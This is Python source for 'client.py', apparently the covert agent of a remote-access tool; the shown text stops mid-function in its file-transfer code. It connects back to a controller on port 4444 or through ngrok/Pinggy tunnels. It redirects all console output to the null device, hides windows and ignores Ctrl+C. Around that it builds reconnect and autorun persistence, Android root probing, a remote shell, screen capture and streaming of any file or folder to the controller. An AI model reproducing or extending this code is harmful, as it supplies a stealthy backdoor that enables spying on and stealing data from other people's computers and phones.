# client.py - v20 (automatic TCP / HTTP / HTTPS; accepts a bare IP, host:port,
#                   tcp://, tls://, http://, https://, or a full Pinggy/ngrok
#                   URL; WebSocket first, then streaming HTTP, then half-duplex;
#                   macOS, Android/Termux and iOS-aware; instant commands, fast
#                   capture, persistent + shell, screen share in its own thread,
#                   Ctrl+B background / Ctrl+Z kill, queued requests answered,
#                   floods cut off not killed)

import atexit
import base64
import codecs
import contextlib
import errno
import hashlib
import importlib.util
import io
import ipaddress
import json
import os
import platform
import queue
import re
import secrets
import select
import shutil
import signal
import socket
import ssl
import stat
import struct
import subprocess
import sys
import tempfile
import threading
import time
from urllib.parse import quote, urlsplit

# ---------------------------------------------------------------------------
# Transport selection.  The client discovers the transport automatically; this
# value is only the preferred family when the address has no scheme:
#     auto   try the fastest/proper order for the address (recommended)
#     tcp    prefer raw TCP on a LAN
#     http   prefer plain HTTP
#     https  prefer HTTPS (normal for Pinggy/ngrok URLs)
# Both bare names and quoted strings are accepted.  The controller accepts all
# of them on one port, so the two files never need matching values.
# ---------------------------------------------------------------------------
auto = 'auto'
tcp = 'tcp'
http = 'http'
https = 'https'
connection_type = auto         # <- auto / https / http / tcp

DEFAULT_IP = '192.168.0.113'
DEFAULT_PORT = 4444
RETRY_DELAY = 1               # seconds between reconnect attempts
CONNECT_TIMEOUT = 3           # seconds a TCP connect may take before we retry
MAX_MSG = 96 * 1024 * 1024    # sanity bound for one protocol message
TRANSFER_CHUNK = 1024 * 1024   # streamed file bytes carried by one JSON message
MAX_TRANSFER_CHUNK = 4 * 1024 * 1024   # receiver-side sanity bound only
TRANSFER_ENTRY_BATCH = 4096    # huge folder manifests are streamed in batches
TRANSFER_ENTRY_BYTES = 4 * 1024 * 1024   # ... and by encoded size, not only count
MAX_CAPTURE_BYTES = 256 * 1024 * 1024  # only a screenshot helper's output
CONNECTION_TYPE = str(os.environ.get('TUNNEL_TYPE') or connection_type).strip().lower()
VALID_CONNECTION_TYPES = ('auto', 'tcp', 'http', 'https')
HTTP_HANDSHAKE_TIMEOUT = 10    # seconds for HTTP headers / TLS handshake
HTTP_SEND_STALL_TIMEOUT = 30   # tolerate a slow-but-moving mobile link
HTTP_MAX_HEADER = 32 * 1024    # reject an endless response header
HTTP_MAX_LINE = 4096           # one chunk-size/trailer line
HTTP_MAX_CHUNK = MAX_MSG       # one HTTP chunk cannot claim unlimited memory
CMON_MAGIC = b'CMON2\n'
CMON_ACK = b'CMON2 OK\n'
CMON_MARKER_HEADER = 'X-CMon'
CMON_MARKER_VALUE = '1'
CMON_VERSION = '2'
CMON_USER_AGENT = 'cmon-client/2'
CMON_WS_PROTOCOL = 'cmon.v1'
CMON_WS_MAX_FRAME = 1024 * 1024
CMON_WS_PING = 20.0
CMON_WS_DEAD = 65.0
# Streaming HTTP has no protocol ping.  A one-byte chunk with the harmless
# "cmon-ping" extension keeps ngrok/Pinggy from expiring an idle request and
# is stripped by the tunnel reader before the application sees it.
CMON_HTTP_PING = 20.0
CMON_HTTP_DEAD = 125.0
TUNNEL_PROBE_TIMEOUT = 12.0
HALF_UP_BATCH = 1024 * 1024   # fewer round trips; still small for public tunnels
HALF_UP_TIMEOUT = 120         # seconds for one /up body through a slow tunnel
CMON_TRANSPORT_CACHE = {'key': None, 'kind': None}
CMON_TRANSPORT_LOCK = threading.Lock()
MAX_OUTPUT = 8 * 1024 * 1024  # keep this much output; a flood is cut off, not killed
SCREEN_SIZE = (960, 540)      # screen share frame size (width, height)
SCREEN_JPEG_QUALITY = 70      # JPEG quality for streamed frames
SCREENSHOT_JPEG_QUALITY = 85  # JPEG quality for one-shot screenshots
SCREEN_SEND_TIMEOUT = 30      # seconds a send may stall before we give up
SEND_TIMEOUT = 2              # seconds one blocking send() may park in the kernel
SEND_CHUNK = 512 * 1024       # write in bounded pieces so a stuck peer can't park a thread
SOCKET_BUFFER = 4 * 1024 * 1024   # kernel TCP/socketpair buffers (file-share tuning)
RECV_CHUNK = 1024 * 1024      # one recv() may hand over this much data
RECV_STALL_TIMEOUT = 300      # only a genuinely stuck peer is disconnected
KEEPALIVE_IDLE = 5            # seconds of silence before TCP keepalive probes start
KEEPALIVE_INTERVAL = 3        # seconds between keepalive probes
KEEPALIVE_COUNT = 3           # failed probes before the connection is declared dead
CREATE_NO_WINDOW = 0x08000000 # Windows: never flash a console window (ignored elsewhere)


def _quiet_flags():
    """Extra Popen keywords so helper processes never flash a console window
    on Windows (empty elsewhere)."""
    if os.name == 'nt':
        return {'creationflags': CREATE_NO_WINDOW}
    return {}


def _silence_console():
    """Make this client produce absolutely no console output.

    The client is a remote agent: every useful message travels over the
    protocol to controller.py.  Redirect the process's real stdout and stderr
    file descriptors to the null device, not only Python's print functions, so
    tracebacks, library warnings, helper-process noise and platform messages
    cannot leak to the terminal either.  Network traffic, the interactive
    shell's PTY and captured command output are unaffected.
    """
    try:
        null_fd = os.open(os.devnull, os.O_WRONLY)
    except OSError:
        return
    try:
        for fd in (1, 2):
            try:
                os.dup2(null_fd, fd)
            except OSError:
                pass
    finally:
        if null_fd > 2:
            try:
                os.close(null_fd)
            except OSError:
                pass
    # Keep the TextIOWrapper objects coherent for any later .flush() call.
    for name in ('stdout', 'stderr'):
        try:
            getattr(sys, name).flush()
        except Exception:
            pass


def _harden_console():
    """Print odd controller-supplied names without ever raising.

    JSON can carry lone surrogates and a redirected stdout can be ASCII;
    without this, printing such a filename raised UnicodeEncodeError inside
    the receive loop. backslashreplace keeps the text visible as escapes."""
    for stream in (sys.stdout, sys.stderr):
        try:
            stream.reconfigure(errors='backslashreplace')
        except (AttributeError, OSError, ValueError):
            pass
SCRIPT_PATH = os.path.abspath(__file__)                            # what autorun restarts
AUTORUN_NAME = re.sub(r'[^A-Za-z0-9_.-]+', '-',
                      os.path.splitext(os.path.basename(SCRIPT_PATH))[0]) or 'client'


def _windows_dpi_aware():
    """Make screenshots return real pixels on a scaled display.

    A DPI-unaware process gets virtualized coordinates and is bitmap-stretched
    by Windows, so ImageGrab would return a blurry, wrongly sized picture.
    Best effort: an existing manifest setting simply wins (the call fails)."""
    if os.name != 'nt':
        return
    try:
        import ctypes
        try:
            # DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2 (Windows 10 1703+)
            if ctypes.windll.user32.SetProcessDpiAwarenessContext(-4):
                return
        except (AttributeError, OSError):
            pass
        try:
            ctypes.windll.shcore.SetProcessDpiAwareness(2)   # Windows 8.1+
            return
        except (AttributeError, OSError):
            pass
        ctypes.windll.user32.SetProcessDPIAware()            # Vista+
    except Exception:
        pass


def _immune_to_ctrl_c():
    """Ctrl+C in this client must never end it.

    A Python-level no-op handler is used on purpose instead of SIG_IGN:
    a caught signal is reset to its default on exec(), so shell commands,
    the interactive PTY shell and every child we spawn still receive their
    own Ctrl+C exactly like before. Ctrl+Z (the controller's stop) and the
    controller's 'exit' command keep working as the ways to end things."""
    try:
        signal.signal(signal.SIGINT, lambda *_: None)
    except (ValueError, OSError, AttributeError):   # not the main thread
        pass


# ---------------------------------------------------------------------------
# Platform detection
#
# Order matters: Android reports sys.platform == 'linux', and a jailbroken
# iOS Python reports 'darwin', so both checks run before the generic ones.
# Everything here is cached; the hot command path never pays for it.
# ---------------------------------------------------------------------------
_PLATFORM_CACHE = {}
_ANDROID_PROPS = [None]
_ANDROID_PROPS_LOCK = threading.Lock()
_ANDROID_ROOT = [None]          # only successes are cached forever
_ANDROID_ROOT_DENIED = [None]   # last failed probe (monotonic): retried after a pause


def is_android():
    """True on Android/Termux (and on CPython built for Android)."""
    if 'android' not in _PLATFORM_CACHE:
        try:
            prefix = os.environ.get('PREFIX') or ''
            result = (hasattr(sys, 'getandroidapilevel')
                      or os.environ.get('ANDROID_ROOT') == '/system'
                      or prefix.startswith('/data/data/com.termux')
                      or (os.path.exists('/system/build.prop')
                          and os.path.exists('/system/bin/sh')))
        except Exception:
            result = False
        _PLATFORM_CACHE['android'] = result
    return _PLATFORM_CACHE['android']


def is_ios():
    """True on iOS/iPadOS, including jailbroken devices where Python is a
    normal Darwin build (there the system version file says iPhone OS)."""
    if 'ios' not in _PLATFORM_CACHE:
        result = False
        if sys.platform == 'ios':
            result = True                   # Pythonista / BeeWare style Python
        elif sys.platform == 'darwin':
            try:
                import plistlib
                with open('/System/Library/CoreServices/SystemVersion.plist', 'rb') as f:
                    info = plistlib.load(f)
                product = str(info.get('ProductName') or '')
                result = ('iPhone OS' in product or 'iPadOS' in product
                          or product == 'iOS')
            except Exception:
                result = False
        _PLATFORM_CACHE['ios'] = result
    return _PLATFORM_CACHE['ios']


def is_macos():
    if 'macos' not in _PLATFORM_CACHE:
        _PLATFORM_CACHE['macos'] = (sys.platform == 'darwin' and not is_ios())
    return _PLATFORM_CACHE['macos']


def gui_session_available():
    """False on a headless Linux host (Ubuntu/RHEL Server, SSH-only box).

    There is no screen to capture there, so the client must not spend minutes
    trying to install Pillow before its first connection. Windows, macOS,
    Android and iOS always have a screen (stock iOS still blocks capture,
    which is reported separately)."""
    if not sys.platform.startswith('linux') or is_android():
        return True
    return bool(os.environ.get('DISPLAY') or os.environ.get('WAYLAND_DISPLAY'))


def _android_props():
    """Android build properties (one getprop call, cached)."""
    with _ANDROID_PROPS_LOCK:
        if _ANDROID_PROPS[0] is None:
            props = {}
            exe = shutil.which('getprop') or '/system/bin/getprop'
            try:
                out = subprocess.run([exe], stdout=subprocess.PIPE,
                                     stderr=subprocess.DEVNULL, timeout=5).stdout
                text = out.decode('utf-8', 'replace')
                for line in text.splitlines():
                    match = re.match(r'^\[([^\]]+)\]:\s*\[(.*)\]$', line)
                    if match:
                        props[match.group(1)] = match.group(2)
            except Exception:
                pass
            _ANDROID_PROPS[0] = props
        return _ANDROID_PROPS[0]


def android_api():
    # Newer Termux exports this, so a restricted environment does not need
    # the getprop subprocess at all.
    env = (os.environ.get('ANDROID__BUILD_VERSION_SDK') or '').strip()
    if env.isdigit():
        return int(env)
    try:
        return int(_android_props().get('ro.build.version.sdk') or 0)
    except (TypeError, ValueError):
        return 0


def android_name():
    props = _android_props()
    version = props.get('ro.build.version.release')
    if not version:
        return 'Android (version unknown)'
    api = props.get('ro.build.version.sdk')
    manufacturer = props.get('ro.product.manufacturer') or ''
    model = props.get('ro.product.model') or ''
    name = 'Android {}'.format(version)
    if api:
        name += ' (API {})'.format(api)
    device = ' '.join(part for part in (manufacturer, model) if part).strip()
    if device:
        name += ' - {}'.format(device)
    return name


def ios_name():
    version = ''
    try:
        if hasattr(platform, 'ios_ver'):
            info = platform.ios_ver()
            version = getattr(info, 'release', '') or ''
    except Exception:
        version = ''
    if not version:
        try:
            import plistlib
            with open('/System/Library/CoreServices/SystemVersion.plist', 'rb') as f:
                version = str(plistlib.load(f).get('ProductVersion') or '')
        except Exception:
            version = ''
    return 'iOS {}'.format(version) if version else 'iOS'


MACOS_CODENAMES = {'26': 'Tahoe', '27': 'Golden Gate'}


def macos_name():
    version = platform.mac_ver()[0] or platform.release()
    codename = MACOS_CODENAMES.get(version.split('.')[0])
    return 'macOS {}{}'.format(version, ' ({})'.format(codename) if codename else '')


def _su_path():
    """Magisk/KernelSU ship su in /system/bin (not on Termux's PATH).
    Magisk 30+ also keeps its binary in /debug_ramdisk; try that last so it
    never shadows a working /system/bin/su."""
    found = shutil.which('su')
    if found:
        return found
    for path in ('/system/bin/su', '/system/xbin/su', '/sbin/su',
                 '/debug_ramdisk/su'):
        if os.path.exists(path):
            return path
    return None


def _android_root():
    """True when su is granted. A success is cached forever. A failure is
    remembered for a short pause, so a denied/slow Magisk prompt is not shown
    on every single screenshot, while a later grant still works."""
    if _ANDROID_ROOT[0]:
        return True
    denied_at = _ANDROID_ROOT_DENIED[0]
    if denied_at is not None and time.monotonic() - denied_at < 45:
        # time.monotonic() counts from boot, so a numeric sentinel would skip
        # the first probe on a freshly rebooted device (Termux:Boot).
        return False
    su = _su_path()
    if not su:
        return False
    try:
        proc = subprocess.run([su, '-c', 'id -u'], stdout=subprocess.PIPE,
                              stderr=subprocess.DEVNULL, timeout=10)
        ok = (proc.returncode == 0
              and proc.stdout.decode('utf-8', 'replace').strip() == '0')
    except Exception:
        ok = False
    if ok:
        _ANDROID_ROOT[0] = True
    else:
        _ANDROID_ROOT_DENIED[0] = time.monotonic()
    return ok


def _android_wake_lock(enable):
    """Keep Termux alive while the client runs (no-op elsewhere)."""
    if not is_android():
        return
    exe = shutil.which('termux-wake-lock' if enable else 'termux-wake-unlock')
    if not exe:
        return
    try:
        subprocess.run([exe], stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL, timeout=5)
    except Exception:
        pass


def _shell_executable():
    """Android has no /bin/sh in the Termux root; use Termux's own sh.
    Everywhere else None keeps Python's default /bin/sh exactly as before."""
    if is_android():
        return shutil.which('sh') or '/system/bin/sh'
    return None


def _tune_socket(sock):
    """Low latency + fast dead-controller detection.

    On VM/NAT setups the FIN of a killed controller can get lost, leaving the
    client blocked on a half-open connection forever (that was the "must log
    out of the VM to reconnect" bug). Tuned keepalives make the kernel notice
    a dead peer within ~15 seconds, so the reconnect loop below takes over.
    They also keep VMware NAT mappings from expiring while idle."""
    # select() only promises that some space is free; the blocking send()
    # after it can still park inside the kernel for ~15 minutes when the
    # controller stopped reading. A short send timeout turns that into a clean
    # OSError, and the reconnect loop takes over.
    try:
        if os.name == 'nt':
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDTIMEO,
                            SEND_TIMEOUT * 1000)              # Windows: milliseconds
        else:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDTIMEO,
                            struct.pack('ll', SEND_TIMEOUT, 0))   # POSIX: timeval
    except OSError:
        pass
    try:
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    except OSError:
        pass
    # Large kernel buffers keep a WAN/tunnel link full even when the peer is a
    # little late reading.  The reference file-share project uses 4 MB; the old
    # default (~64 KB) throttled every transfer over a high-latency tunnel.
    for option in (socket.SO_SNDBUF, socket.SO_RCVBUF):
        try:
            sock.setsockopt(socket.SOL_SOCKET, option, SOCKET_BUFFER)
        except OSError:
            pass
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    except OSError:
        return
    # Each knob is set independently: macOS has TCP_KEEPALIVE (idle) plus
    # TCP_KEEPINTVL/TCP_KEEPCNT, Linux has TCP_KEEPIDLE+INTVL+CNT, and some
    # platforms have only a subset. The old if/elif skipped interval/count on
    # macOS entirely, so a dead controller could take minutes to notice.
    if hasattr(socket, 'TCP_KEEPIDLE'):            # Linux
        with contextlib.suppress(OSError):
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, KEEPALIVE_IDLE)
    if hasattr(socket, 'TCP_KEEPALIVE'):           # macOS (legacy name for idle)
        with contextlib.suppress(OSError):
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPALIVE, KEEPALIVE_IDLE)
    if hasattr(socket, 'TCP_KEEPINTVL'):
        with contextlib.suppress(OSError):
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, KEEPALIVE_INTERVAL)
    if hasattr(socket, 'TCP_KEEPCNT'):
        with contextlib.suppress(OSError):
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, KEEPALIVE_COUNT)
    if os.name == 'nt':
        try:
            sock.ioctl(socket.SIO_KEEPALIVE_VALS,
                       (1, KEEPALIVE_IDLE * 1000, KEEPALIVE_INTERVAL * 1000))
        except (AttributeError, OSError):
            pass


def _socket_pending(conn):
    """Application bytes buffered above the kernel (TLS/adapters).

    select() cannot see an SSLSocket's decrypted buffer; without this check a
    complete hello_ack could appear to time out on a direct-TLS connection."""
    for candidate in (conn, getattr(conn, 'raw', None)):
        if candidate is None:
            continue
        try:
            return int(candidate.pending())
        except (AttributeError, OSError, ValueError):
            continue
    return 0


def recv_exact(conn, n, stall=False, deadline=None):
    """Read exactly n bytes.

    stall=False: the *first* byte may take forever - an idle connection is
      normal and must not look like a dead one; once part of the message has
      arrived, a freeze triggers a reconnect.
    stall=True: even the first byte must arrive within RECV_STALL_TIMEOUT -
      used for the body of a message whose header already arrived, so a peer
      that vanishes between header and payload cannot park us in recv().
    deadline: absolute time.time() bound for the whole read; a peer that
      trickles one byte just before each stall timeout is still cut off."""
    chunks = []
    while n > 0:
        timeout = None
        if deadline is not None:
            timeout = deadline - time.time()
            if timeout <= 0:
                return None
            if stall:
                timeout = min(timeout, RECV_STALL_TIMEOUT)
        elif chunks or stall:
            timeout = RECV_STALL_TIMEOUT
        if timeout is not None and _socket_pending(conn) <= 0:
            readable, _, _ = select.select([conn], [], [], timeout)
            if not readable:
                return None
        chunk = conn.recv(min(n, RECV_CHUNK))
        if not chunk:
            return None
        chunks.append(chunk)
        n -= len(chunk)
    return b''.join(chunks)


SEND_LOCK = threading.Lock()    # one writer at a time: frames and replies
CANCELED = {}                   # request ids the controller stopped -> why (Ctrl+Z/stop)
CANCELED_LOCK = threading.Lock()
DEFERRED = []                   # requests that arrived while a command was running
MAX_DEFERRED = 32               # bound queued requests so a slow command cannot OOM
MAX_DEFERRED_BYTES = 128 * 1024 * 1024


def _send_chunked(conn, payload, stall_timeout=None, deadline=None):
    """sendall() in bounded chunks, but judge a peer by *progress*.

    A single sendall() of a 50 MB file could park a thread until TCP gives up
    on a lost FIN. A short SO_SNDTIMEO alone was too harsh in the other
    direction: a slow 2G/mobile link that keeps reading was disconnected just
    because one window took a couple of seconds. Here each send timeout only
    counts as "no progress"; a peer that is draining bytes (even slowly) keeps
    going, while one that accepts nothing for SCREEN_SEND_TIMEOUT is dropped.

    Shell output passes a larger stall timeout because a terminal may print a
    huge burst while a tunnel is briefly busy; one 2-second kernel timeout is
    never a reason to tear down an interactive session.
    """
    stall_timeout = SCREEN_SEND_TIMEOUT if stall_timeout is None else stall_timeout
    view = memoryview(payload)
    last_progress = time.time()
    while view:
        if deadline is not None and time.time() > deadline:
            raise OSError('send timed out: transfer made too little progress')
        try:
            sent = conn.send(view[:SEND_CHUNK])
        except (socket.timeout, TimeoutError, BlockingIOError):
            sent = 0
        if sent:
            view = view[sent:]
            last_progress = time.time()
            continue
        if time.time() - last_progress > stall_timeout:
            raise OSError('send stalled: controller stopped reading')
        # SO_SNDTIMEO already waited; this only prevents a hot spin on a
        # platform where send returns 0 instead of raising.
        time.sleep(0.02)


def _send_shell_output(conn, data):
    """Send raw terminal output without letting a momentary tunnel stall kill
    the shell. Returns False only when the peer is genuinely gone."""
    if not data:
        return True
    try:
        _send_chunked(conn, data, stall_timeout=30,
                      deadline=time.time() + 300 + len(data) / 16384.0)
        return True
    except (OSError, ValueError):
        return False


def send_msg(conn, obj):
    """Send one JSON message.

    A screen share runs in its own thread, so two threads can be sending at
    the same time: without the lock their 4-byte length headers and payloads
    would interleave and desync the whole protocol."""
    payload = json.dumps(obj, separators=(',', ':')).encode('utf-8')
    # One buffer under the lock: if this fails part-way the connection is
    # retired; the controller must never interpret the next message as the
    # tail of a previous one.
    with SEND_LOCK:
        _send_chunked(conn, len(payload).to_bytes(4, 'big') + payload)


def _valid_req_id(req_id):
    """JSON request ids are scalars. A dict/list id would raise TypeError when
    used as a dict key, so hostile input must be rejected, not trusted."""
    return isinstance(req_id, (str, int, float, bool))


def _mark_canceled(req_id, why='Ctrl+Z'):
    """Remember a canceled request so it is skipped when the client picks it up."""
    if req_id is None or not _valid_req_id(req_id):
        return
    with CANCELED_LOCK:
        CANCELED[req_id] = why
        if len(CANCELED) > 512:     # defensive bound; entries free up as they arrive
            for old in list(CANCELED)[:64]:
                CANCELED.pop(old, None)


def _is_canceled(req_id):
    if req_id is None or not _valid_req_id(req_id):
        return False
    with CANCELED_LOCK:
        return req_id in CANCELED


def _forget_canceled(req_id):
    """Drop a canceled id and report why it was canceled (None if unknown)."""
    if req_id is None or not _valid_req_id(req_id):
        return None
    with CANCELED_LOCK:
        return CANCELED.pop(req_id, None)


def _message_weight(item):
    """Estimate the memory a JSON message holds, including nested values."""
    total = 0
    stack = [item]
    while stack:
        value = stack.pop()
        if isinstance(value, str):
            total += len(value)
        elif isinstance(value, dict):
            for key, child in value.items():
                if isinstance(key, str):
                    total += len(key)
                stack.append(child)
        elif isinstance(value, (list, tuple)):
            stack.extend(value)
        elif value is None:
            total += 1
        else:
            total += 8
        if total > MAX_DEFERRED_BYTES:
            return total
    return total


def _defer_message(msg):
    """Queue a request that arrived during a command, within hard bounds.

    A controller that queues large uploads while a long command runs could
    otherwise grow this list without limit (each message can approach
    MAX_MSG). Rejecting excess requests with an error is better than an OOM
    on a phone or a small server."""
    if len(DEFERRED) >= MAX_DEFERRED:
        return False
    weight = _message_weight(msg)
    queued = sum(_message_weight(item) for item in DEFERRED)
    if queued + weight > MAX_DEFERRED_BYTES:
        return False
    DEFERRED.append(msg)
    return True


def recv_msg(conn, deadline=None):
    try:
        header = recv_exact(conn, 4, deadline=deadline)
        if header is None:
            return None
        size = int.from_bytes(header, 'big')
        if size > MAX_MSG:              # desynced/garbage stream - reconnect
            return None
        # Only the caller's absolute deadline (tunnel handshakes) bounds a
        # message.  File transfers are not cancelled by a throughput guess;
        # the controller decides when a transfer stops.
        payload = recv_exact(conn, size, stall=True, deadline=deadline)
        if payload is None:
            return None
        msg = json.loads(payload.decode('utf-8'))
        return msg if isinstance(msg, dict) else None    # garbage -> reconnect
    except (OSError, ValueError, RecursionError):
        # Deeply nested JSON raises RecursionError, which is a RuntimeError -
        # without catching it here the whole client exited on a bad message.
        return None


_WINDOWS_RESERVED_NAMES = (
    {'CON', 'PRN', 'AUX', 'NUL'}
    | {'COM{}'.format(i) for i in range(1, 10)}
    | {'LPT{}'.format(i) for i in range(1, 10)})


def _safe_transfer_rel(value):
    """Normalize a remote path so it can never escape the destination.

    Mirrors the controller's sanitizer.  Backslashes become separators,
    absolute prefixes are stripped, ".." is rejected, Windows-invalid
    characters and device names/ADS colons are rewritten.  Returns a
    POSIX-style relative path.
    """
    if not isinstance(value, str):
        return None
    value = value.replace('\\', '/').replace('\x00', '')
    if value.startswith('/'):
        value = value.lstrip('/')
    parts = []
    for part in value.split('/'):
        if part in ('', '.'):
            continue
        if part == '..':
            return None
        cleaned = []
        for char in part:
            if char in '<>:"|?*' or ord(char) < 32 or char == '\x7f':
                cleaned.append('_')
            else:
                cleaned.append(char)
        part = ''.join(cleaned).rstrip(' .')
        if not part:
            continue
        if part.split('.', 1)[0].upper() in _WINDOWS_RESERVED_NAMES:
            part = '_' + part
        if len(part) > 240:
            return None
        parts.append(part)
    if not parts:
        return None
    result = '/'.join(parts)
    return result if len(result) <= 3000 else None


def _safe_join_under(base, rel):
    """Join a sanitized path and refuse to traverse an existing symlink."""
    current = base
    parts = rel.split('/')
    for index, part in enumerate(parts):
        current = os.path.join(current, part)
        if os.path.islink(current):
            raise OSError('refusing to write through symlink: {}'.format(current))
        last = index == len(parts) - 1
        if not last:
            if os.path.exists(current):
                if not os.path.isdir(current):
                    raise OSError('not a directory: {}'.format(current))
            else:
                os.mkdir(current)
    return current


def _scan_transfer_tree(path, top_name=None, cancel=None):
    """Build the manifest for a file/folder this client will upload.

    Returns None if ``cancel`` is set while walking a large tree.  The
    controller is the only side that can cancel; the client only obeys.
    """
    def stopped():
        return cancel is not None and cancel.is_set()

    if stopped():
        return None
    source = os.path.abspath(os.path.expanduser(path))
    warnings = []
    if os.path.islink(source):
        raise OSError('symbolic links are not sent; use the real folder')
    if os.path.isfile(source):
        info = os.stat(source)
        root = _safe_transfer_rel(top_name or os.path.basename(source))
        if not root:
            raise OSError('the file name is not safe to send')
        return {'source': source, 'kind': 'file', 'root': root,
                'entries': [],
                'files': [(root, source, int(info.st_size),
                           stat.S_IMODE(info.st_mode))],
                'total_files': 1, 'total_bytes': info.st_size,
                'warnings': warnings}
    if not os.path.isdir(source):
        raise OSError('not a regular file or folder')
    root = _safe_transfer_rel(top_name or os.path.basename(source.rstrip(
        os.sep))) or 'upload'
    entries = []
    files = []
    seen = set()
    total_files = 0
    total_bytes = 0
    for base, dirnames, filenames in os.walk(source, followlinks=False):
        if stopped():
            return None
        rel_base = os.path.relpath(base, source)
        rel_parent = None if rel_base == '.' else _safe_transfer_rel(rel_base)
        if rel_base != '.' and not rel_parent:
            # The parent was already skipped; do not send its descendants.
            warnings.append('skipped unsafe folder {}'.format(rel_base))
            dirnames[:] = []
            continue
        kept = []
        for name in sorted(dirnames):
            full = os.path.join(base, name)
            if os.path.islink(full):
                warnings.append('skipped symlink {}'.format(full))
                continue
            rel = _safe_transfer_rel(
                name if rel_parent is None else rel_parent + '/' + name)
            if not rel:
                warnings.append('skipped unsafe folder {}'.format(full))
                continue
            if rel in seen:
                warnings.append('skipped colliding folder {}'.format(full))
                continue
            seen.add(rel)
            entries.append({'path': rel, 'kind': 'dir'})
            kept.append(name)
        dirnames[:] = kept
        for name in sorted(filenames):
            if stopped():
                return None
            full = os.path.join(base, name)
            if os.path.islink(full):
                warnings.append('skipped symlink {}'.format(full))
                continue
            try:
                info = os.lstat(full)
            except OSError as e:
                warnings.append('skipped {}: {}'.format(full, e))
                continue
            if not stat.S_ISREG(info.st_mode):
                warnings.append('skipped special file {}'.format(full))
                continue
            rel = _safe_transfer_rel(
                name if rel_parent is None else rel_parent + '/' + name)
            if not rel:
                warnings.append('skipped unsafe name {}'.format(full))
                continue
            if rel in seen:
                warnings.append('skipped colliding file {}'.format(full))
                continue
            seen.add(rel)
            mode = stat.S_IMODE(info.st_mode)
            entries.append({'path': rel, 'kind': 'file',
                            'size': int(info.st_size), 'mode': mode})
            files.append((rel, full, int(info.st_size), mode))
            total_files += 1
            total_bytes += int(info.st_size)
    if stopped():
        return None
    return {'source': source, 'kind': 'dir', 'root': root, 'entries': entries,
            'files': files, 'total_files': total_files,
            'total_bytes': total_bytes, 'warnings': warnings}


OUTGOING_TRANSFERS = {}
OUTGOING_LOCK = threading.Lock()


def _outgoing_key(req_id):
    return req_id if _valid_req_id(req_id) else None


def _outgoing_cancel(req_id):
    """Ask a running download worker to stop before its next chunk."""
    key = _outgoing_key(req_id)
    if key is None:
        return False
    with OUTGOING_LOCK:
        event = OUTGOING_TRANSFERS.get(key)
    if event is None:
        return False
    event.set()
    return True


def _abort_outgoing_transfers():
    """Signal every download worker; the socket may be gone already."""
    with OUTGOING_LOCK:
        events = list(OUTGOING_TRANSFERS.values())
        OUTGOING_TRANSFERS.clear()
    for event in events:
        event.set()


def _start_download_transfer(conn, req_id, real_path):
    """Run a streamed download off the read loop so cancel stays responsive."""
    key = _outgoing_key(req_id)
    cancel = threading.Event()
    if key is not None:
        with OUTGOING_LOCK:
            old = OUTGOING_TRANSFERS.get(key)
            if old is not None:
                old.set()
            OUTGOING_TRANSFERS[key] = cancel

    def worker():
        try:
            _download_transfer(conn, req_id, real_path, cancel)
        except Exception:
            # A send/read failure has desynchronized or closed this link; the
            # main loop will see EOF and reconnect.  Never print a traceback
            # from a background transfer.
            pass
        finally:
            if key is not None:
                with OUTGOING_LOCK:
                    if OUTGOING_TRANSFERS.get(key) is cancel:
                        del OUTGOING_TRANSFERS[key]

    threading.Thread(target=worker, name='download-transfer',
                     daemon=True).start()


def _entry_batches(entries):
    """Yield manifest batches bounded by both item count and rough bytes."""
    batch = []
    size = 0
    for entry in entries:
        try:
            item_size = len(entry.get('path') or '') + 96
        except Exception:
            item_size = 128
        if batch and (len(batch) >= TRANSFER_ENTRY_BATCH
                      or size + item_size > TRANSFER_ENTRY_BYTES):
            yield batch
            batch = []
            size = 0
        batch.append(entry)
        size += item_size
    if batch:
        yield batch


def _download_transfer(conn, req_id, real_path, cancel=None):
    """Stream any file or folder to the controller.

    Every file uses this path, so file size is not capped.  The controller
    writes each file to a temporary name and atomically replaces the
    destination only after size and SHA-256 match.  No complete file is held
    in memory on either side.  Runs in a worker thread: the main read loop
    stays free to receive a cancellation (`stop`/Ctrl+Z) while this runs.
    """
    def canceled():
        return cancel is not None and cancel.is_set()

    def stop_early():
        try:
            send_msg(conn, {'type': 'transfer_abort', 'id': req_id,
                            'reason': 'canceled by the controller'})
            send_msg(conn, {'type': 'transfer_end', 'id': req_id})
        except OSError:
            pass

    if cancel is not None and cancel.is_set():
        stop_early()
        return
    try:
        plan = _scan_transfer_tree(real_path, cancel=cancel)
    except Exception as e:
        send_msg(conn, {'type': 'error', 'id': req_id,
                        'data': 'download failed: {}'.format(e)})
        return
    if plan is None or canceled():
        stop_early()
        return
    entries = plan.get('entries') or []
    # Stream unusually large manifests in batches: no count limit and no
    # single protocol message big enough to exhaust a phone's memory.
    # Always use transfer_entries batches, so the begin message stays small
    # regardless of how many files or how long the paths are.
    stream_entries = bool(entries)
    send_msg(conn, {'type': 'transfer_begin', 'id': req_id,
                    'direction': 'download', 'kind': plan['kind'],
                    'root': plan['root'],
                    'entries': [] if stream_entries else entries,
                    'entries_streamed': stream_entries,
                    'total_files': plan['total_files'],
                    'total_bytes': plan['total_bytes']})
    received = 0
    try:
        if stream_entries:
            for batch in _entry_batches(entries):
                if canceled():
                    stop_early()
                    return
                send_msg(conn, {'type': 'transfer_entries', 'id': req_id,
                                'entries': batch})
        for rel, source, size, mode in plan.get('files', []):
            if canceled():
                stop_early()
                return
            send_msg(conn, {'type': 'transfer_file_begin', 'id': req_id,
                            'path': rel, 'size': size, 'mode': mode})
            digest = hashlib.sha256()
            sent = 0
            try:
                with open(source, 'rb') as f:
                    while True:
                        if canceled():
                            stop_early()
                            return
                        chunk = f.read(TRANSFER_CHUNK)
                        if not chunk:
                            break
                        digest.update(chunk)
                        sent += len(chunk)
                        send_msg(conn, {
                            'type': 'transfer_chunk', 'id': req_id,
                            'data': base64.b64encode(chunk).decode('ascii')})
